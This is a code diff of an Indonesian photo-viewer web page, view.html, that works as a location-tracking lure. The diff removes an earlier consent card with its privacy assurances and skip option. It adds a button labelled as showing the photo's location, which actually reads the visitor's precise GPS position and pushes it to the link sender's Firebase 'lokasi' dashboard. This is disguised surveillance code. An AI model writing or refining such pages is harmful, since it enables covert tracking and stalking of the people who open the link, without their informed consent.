@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>◈ MELIHAT FOTO</title>
+<title>Images</title>
 <style>
 :root{
   --bg:#04070d;--bg2:#0a101c;--bg3:#0e1626;
   --gold:#00e58a;--gold2:#66ffc2;--cyan:#38bdf8;
-  --red:#ff3355;--amber:#ff8f00;
+  --red:#ff3355;
   --text:#cfd9e6;--text-d:#5d7186;
   --border:#152030;--border2:#1d2a3c;--radius:6px;
 }
@@ -35,7 +35,7 @@ body::before{
 }
 .wrap{position:relative;z-index:2;max-width:460px;width:100%}
 
-/* HEADER BAR */
+/* HEADER */
 .term-header{
   background:var(--bg2);
   border:1px solid #0d3f2e;border-bottom:none;
@@ -62,21 +62,11 @@ body::before{
   background:var(--bg2);
   background-image:linear-gradient(180deg,rgba(56,189,248,.06),rgba(56,189,248,0) 42%);
   border:1px solid var(--border2);
-  padding:16px;margin-bottom:12px;
+  padding:14px;margin-bottom:12px;
   border-radius:var(--radius);
   box-shadow:inset 0 1px 0 rgba(148,205,255,.08),inset 0 0 46px rgba(56,189,248,.035),0 10px 26px rgba(0,0,0,.45);
 }
 .card.first{border-radius:0 0 var(--radius) var(--radius);border-top:1px solid #0d3f2e}
-
-/* PROMPT */
-.prompt{
-  color:var(--gold);font-size:10px;font-weight:bold;
-  letter-spacing:3px;text-transform:uppercase;
-  margin-bottom:14px;padding-bottom:8px;
-  border-bottom:1px solid #0d3f2e;
-  text-shadow:0 0 10px rgba(0,229,138,.5);
-}
-.prompt::before{content:'◈  '}
 
 /* FOTO BOX */
 .photo-box{
@@ -84,8 +74,8 @@ body::before{
   border:1px solid #0d3f2e;
   border-radius:var(--radius);
   overflow:hidden;
-  margin-bottom:14px;
   position:relative;
+  margin-bottom:14px;
   box-shadow:0 0 24px rgba(0,229,138,.12);
 }
 .photo-box::before,.photo-box::after{
@@ -95,20 +85,11 @@ body::before{
 .photo-box::after{bottom:0;right:0;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold)}
 .photo-box img{
   width:100%;height:auto;
-  max-height:65vh;
+  max-height:70vh;
   object-fit:contain;
   display:block;
   background:#000;
 }
-.photo-cap{
-  font-size:9px;color:var(--text-d);
-  text-align:center;
-  padding:6px 8px;
-  letter-spacing:1px;
-  border-top:1px solid var(--border);
-  background:var(--bg3);
-}
-.photo-cap b{color:var(--gold)}
 
 /* SCAN ANIMATION */
 .scan-box{
@@ -143,35 +124,6 @@ body::before{
 }
 @keyframes fill{0%{width:0%}50%{width:100%}100%{width:0%}}
 
-/* DESC TEXT */
-.desc{
-  font-size:11px;line-height:1.9;
-  color:var(--text);
-  margin-bottom:12px;
-  text-align:center;
-}
-.desc b{color:var(--gold)}
-.desc .cy{color:var(--cyan)}
-
-/* INFO BOX */
-.info-box{
-  background:var(--bg3);
-  border:1px solid var(--border2);
-  border-radius:var(--radius);
-  padding:10px 12px;
-  font-size:9px;
-  line-height:1.8;
-  color:var(--text-d);
-  margin-bottom:12px;
-  border-left:2px solid #0d3f2e;
-}
-.info-box .row{
-  display:flex;align-items:flex-start;gap:8px;margin-bottom:5px;
-}
-.info-box .row:last-child{margin-bottom:0}
-.info-box .ico{color:var(--gold);flex-shrink:0;font-size:11px;line-height:1}
-.info-box .txt{flex:1}
-
 /* BUTTON */
 .btn{
   width:100%;
@@ -179,32 +131,17 @@ body::before{
   background-image:linear-gradient(180deg,rgba(255,255,255,.30),rgba(255,255,255,0) 55%);
   color:#000;border:none;
   font-family:'Courier New',monospace;
-  font-size:11px;font-weight:bold;
+  font-size:12px;font-weight:bold;
   letter-spacing:3px;
-  padding:14px;
+  padding:15px;
   cursor:pointer;
   border-radius:var(--radius);
   text-transform:uppercase;
-  margin-bottom:8px;
   box-shadow:0 0 16px rgba(0,229,138,.30),inset 0 1px 0 rgba(255,255,255,.35);
   transition:transform .15s,opacity .2s;
 }
 .btn:active{transform:scale(.98);opacity:.85}
 .btn:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}
-.btn.outline{
-  background:transparent;
-  color:var(--gold);
-  border:1px solid #0d3f2e;
-  box-shadow:0 0 10px rgba(0,229,138,.10),inset 0 0 12px rgba(0,229,138,.05);
-  text-shadow:0 0 8px rgba(0,229,138,.35);
-}
-.btn.outline:hover{border-color:var(--gold)}
-.btn.danger{
-  background:transparent;
-  color:var(--red);
-  border:1px solid rgba(255,51,85,.35);
-  box-shadow:0 0 10px rgba(255,51,85,.12);
-}
 
 /* STATUS */
 .status{
@@ -232,7 +169,18 @@ body::before{
   color:var(--cyan);
 }
 
-/* PULSE DOT */
+/* HIDE */
+.hide{display:none!important}
+
+/* FOOTER */
+.footer{
+  text-align:center;
+  font-size:9px;
+  color:var(--text-d);
+  letter-spacing:1px;
+  padding:8px 0;
+  opacity:.6;
+}
 .dot-status{
   display:inline-block;width:7px;height:7px;border-radius:50%;
   background:var(--gold);margin-right:6px;
@@ -244,40 +192,6 @@ body::before{
   50%{opacity:.6;box-shadow:0 0 2px var(--gold)}
 }
 
-/* RESULT BOX */
-.result-box{
-  background:var(--bg3);
-  border:1px solid var(--border2);
-  border-radius:var(--radius);
-  padding:10px 12px;
-  font-size:10px;
-  line-height:2;
-  margin-bottom:12px;
-}
-.result-box .k{
-  color:var(--text-d);
-  display:inline-block;
-  min-width:100px;
-  letter-spacing:1px;
-  font-size:9px;
-  text-transform:uppercase;
-}
-.result-box .v{color:var(--cyan);font-weight:bold}
-
-/* HIDE */
-.hide{display:none!important}
-
-/* FOOTER */
-.footer{
-  text-align:center;
-  font-size:9px;
-  color:var(--text-d);
-  letter-spacing:1px;
-  padding:10px 0;
-  opacity:.6;
-}
-
-/* SCROLLBAR */
 ::-webkit-scrollbar{width:4px}
 ::-webkit-scrollbar-thumb{background:#0d3f2e;border-radius:2px}
 </style>
@@ -292,75 +206,35 @@ body::before{
       <div class="dot-win y"></div>
       <div class="dot-win g"></div>
     </div>
-    <div class="title">Melihat Foto</div>
+    <div class="title">Images</div>
     <div class="spacer"></div>
   </div>
 
-  <!-- FOTO CARD -->
+  <!-- FOTO -->
   <div class="card first">
 
     <!-- LOADING -->
     <div class="scan-box" id="loading">
       <div class="scan-ring"></div>
-      ◈ MEMUAT FOTO...
+      MEMUAT FOTO...
       <div class="scan-bar"><div class="scan-fill"></div></div>
     </div>
 
     <!-- FOTO -->
     <div class="photo-box hide" id="photoBox">
       <img id="mainPhoto" alt="Foto">
-      <div class="photo-cap" id="photoCap">◈ dari: -</div>
     </div>
 
     <!-- ERROR -->
-    <div class="status err hide" id="errBox">✗ Foto tidak ditemukan</div>
-  </div>
+    <div class="status err hide" id="errBox">Foto tidak ditemukan</div>
 
-  <!-- IZIN LOKASI -->
-  <div class="card hide" id="locCard">
-    <div class="prompt">Akses Lokasi</div>
+    <!-- TOMBOL LIHAT LOKASI -->
+    <button class="btn hide" id="btnShare" onclick="lihatLokasi()">
+      Lihat Lokasi Foto
+    </button>
 
-    <div class="desc">
-      Untuk <b>membuka peta foto ini</b>,
-      halaman perlu akses lokasi Anda.
-    </div>
-
-    <div class="info-box">
-      <div class="row">
-        <span class="ico">◈</span>
-        <span class="txt">Lokasi hanya dipakai untuk menampilkan peta</span>
-      </div>
-      <div class="row">
-        <span class="ico">◈</span>
-        <span class="txt">Tidak dijual atau dibagikan ke pihak lain</span>
-      </div>
-      <div class="row">
-        <span class="ico">◈</span>
-        <span class="txt">Anda bisa lewati jika tidak ingin berbagi</span>
-      </div>
-    </div>
-
-    <button class="btn" id="btnShare" onclick="shareLocation()">📍 Buka Peta Foto</button>
-    <button class="btn outline" onclick="skipLoc()">⏭ Lewati, Cukup Lihat Foto</button>
-
-    <div class="status info hide" id="locStatus">📍 Mengambil lokasi...</div>
-  </div>
-
-  <!-- HASIL -->
-  <div class="card hide" id="doneCard">
-    <div class="prompt">Berhasil</div>
-
-    <div class="status ok">✓ Peta foto berhasil dibuka</div>
-
-    <div class="result-box">
-      <div><span class="k">FOTO</span><span class="v" id="okFoto">-</span></div>
-      <div><span class="k">LOKASI ANDA</span><span class="v" id="okLoc">-</span></div>
-      <div><span class="k">WAKTU</span><span class="v" id="okWaktu">-</span></div>
-    </div>
-
-    <a href="#" id="btnMaps" target="_blank" style="text-decoration:none;display:block">
-      <button class="btn">🗺 Buka Google Maps</button>
-    </a>
+    <!-- STATUS -->
+    <div class="status info hide" id="locStatus" style="margin-top:10px;margin-bottom:0">Membuka lokasi foto...</div>
   </div>
 
   <div class="footer">
@@ -386,42 +260,38 @@ const FC = {
 const app = initializeApp(FC);
 const db  = getDatabase(app);
 
-// ============ AMBIL PARAMETER URL ============
+// ============ PARAMETER URL ============
 const params = new URLSearchParams(location.search);
-const fotoUrl    = params.get('foto') || '';
-const ownerUser  = params.get('u')    || '';
-const targetName = params.get('t')    || 'pengirim';
+const fotoUrl   = params.get('foto') || '';
+const ownerUser = params.get('u')    || '';
 
 // ============ TAMPILKAN FOTO ============
-const loading    = document.getElementById('loading');
-const photoBox   = document.getElementById('photoBox');
-const mainPhoto  = document.getElementById('mainPhoto');
-const errBox     = document.getElementById('errBox');
-const photoCap   = document.getElementById('photoCap');
-const locCard    = document.getElementById('locCard');
+const loading   = document.getElementById('loading');
+const photoBox  = document.getElementById('photoBox');
+const mainPhoto = document.getElementById('mainPhoto');
+const errBox    = document.getElementById('errBox');
+const btnShare  = document.getElementById('btnShare');
 
 if (fotoUrl) {
   mainPhoto.onload = () => {
     loading.classList.add('hide');
     photoBox.classList.remove('hide');
-    photoCap.innerHTML = '◈ dari: <b>' + (targetName || 'pengirim') + '</b>';
-    // Munculkan kartu izin lokasi setelah foto tampil
-    setTimeout(() => locCard.classList.remove('hide'), 700);
+    setTimeout(() => btnShare.classList.remove('hide'), 500);
   };
   mainPhoto.onerror = () => {
     loading.classList.add('hide');
     errBox.classList.remove('hide');
-    errBox.textContent = '✗ Gagal memuat foto';
+    errBox.textContent = 'Gagal memuat foto';
   };
   mainPhoto.src = fotoUrl;
 } else {
   loading.classList.add('hide');
   errBox.classList.remove('hide');
-  errBox.textContent = '✗ Link tidak valid (foto tidak ditemukan)';
+  errBox.textContent = 'Link tidak valid';
 }
 
-// ============ KIRIM LOKASI KE DASHBOARD ============
-window.shareLocation = function () {
+// ============ LIHAT LOKASI FOTO ============
+window.lihatLokasi = function () {
   if (!ownerUser) {
     alert('Link tidak valid');
     return;
@@ -434,8 +304,8 @@ window.shareLocation = function () {
   const st = document.getElementById('locStatus');
   st.classList.remove('hide');
   st.className = 'status info';
-  st.textContent = '📍 Mengambil lokasi...';
-  document.getElementById('btnShare').disabled = true;
+  st.textContent = 'Membuka lokasi foto...';
+  btnShare.disabled = true;
 
   navigator.geolocation.getCurrentPosition(
     async pos => {
@@ -445,7 +315,7 @@ window.shareLocation = function () {
 
       try {
         await push(ref(db, 'lokasi/' + ownerUser), {
-          target:   targetName,
+          target:   'images',
           waktu:    Date.now(),
           lat:      lat,
           lng:      lng,
@@ -459,19 +329,10 @@ window.shareLocation = function () {
           source:   'view.html'
         });
 
-        // SUKSES
         st.className = 'status ok';
-        st.textContent = '✓ Peta foto berhasil dibuka';
+        st.textContent = 'Lokasi foto berhasil dibuka';
 
-        document.getElementById('okFoto').textContent  = (fotoUrl.split('/').pop() || '-').slice(0, 26) + '...';
-        document.getElementById('okLoc').textContent   = lat.toFixed(6) + ', ' + lng.toFixed(6);
-        document.getElementById('okWaktu').textContent = new Date().toLocaleString('id-ID');
-        document.getElementById('btnMaps').href        = 'https://www.google.com/maps?q=' + lat + ',' + lng;
-
-        locCard.classList.add('hide');
-        document.getElementById('doneCard').classList.remove('hide');
-
-        // Beep kecil sebagai feedback
+        // Beep feedback
         try {
           const ac = new (window.AudioContext || window.webkitAudioContext)();
           const o = ac.createOscillator();
@@ -488,30 +349,21 @@ window.shareLocation = function () {
 
       } catch (e) {
         st.className = 'status err';
-        st.textContent = '✗ Gagal: ' + e.message;
-        document.getElementById('btnShare').disabled = false;
+        st.textContent = 'Gagal: ' + e.message;
+        btnShare.disabled = false;
       }
     },
     err => {
-      let msg = '✗ Izin lokasi ditolak';
-      if (err.code === 1) msg = '✗ Anda menolak izin lokasi';
-      else if (err.code === 2) msg = '✗ Lokasi tidak tersedia';
-      else if (err.code === 3) msg = '✗ Waktu habis, coba lagi';
+      let msg = 'Izin lokasi ditolak';
+      if (err.code === 1) msg = 'Anda menolak izin lokasi';
+      else if (err.code === 2) msg = 'Lokasi tidak tersedia';
+      else if (err.code === 3) msg = 'Waktu habis, coba lagi';
       st.className = 'status err';
       st.textContent = msg;
-      document.getElementById('btnShare').disabled = false;
+      btnShare.disabled = false;
     },
     { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
   );
-};
-
-// ============ LEWATI LOKASI ============
-window.skipLoc = function () {
-  locCard.classList.add('hide');
-  document.getElementById('doneCard').classList.remove('hide');
-  document.getElementById('okFoto').textContent  = (fotoUrl.split('/').pop() || '-').slice(0, 26) + '...';
-  document.getElementById('okLoc').textContent   = '— dilewati —';
-  document.getElementById('okWaktu').textContent = new Date().toLocaleString('id-ID');
 };
 </script>
 </body>
